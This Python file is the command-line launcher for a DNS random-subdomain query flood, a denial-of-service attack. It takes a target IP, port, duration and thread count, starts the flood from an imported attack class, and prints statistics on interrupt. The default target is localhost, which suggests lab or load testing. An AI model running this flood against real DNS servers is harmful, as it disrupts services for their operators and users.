import argparse
import signal
import sys
import time
from rich.console import Console

from attack.dns_random_subdomain_query_flood import DNSRandomSubdomainQueryFlood


def main():
    console = Console()
    parser = argparse.ArgumentParser(
        description="DNS Random Subdomain Query Flood Attacker",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--target-ip", type=str, default="127.0.0.1", help="DNS server IP address"
    )
    parser.add_argument("--target-port", type=int, default=53, help="DNS server port")
    parser.add_argument(
        "--duration", type=int, default=30, help="Attack duration in seconds"
    )
    parser.add_argument(
        "--threads", type=int, default=10, help="Number of attack threads"
    )
    parser.add_argument(
        "--log-file", type=str, default=None, help="Log file path (optional)"
    )
    args = parser.parse_args()

    attack = DNSRandomSubdomainQueryFlood(
        target_ip=args.target_ip,
        target_port=args.target_port,
        duration=args.duration,
        threads=args.threads,
        log_file=args.log_file,
    )

    def handle_sigint(signum, frame):
        console.print("\n[red]🛑 Received interrupt. Stopping attack...[/red]")
        attack.attack_active = False
        time.sleep(0.5)
        end_time = time.time()
        attack._summarize_attack(attack.metrics.get("start_time", end_time), end_time)
        attack.log_dns_request_stats()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    try:
        attack.attack()
    except KeyboardInterrupt:
        handle_sigint(None, None)


if __name__ == "__main__":
    main()
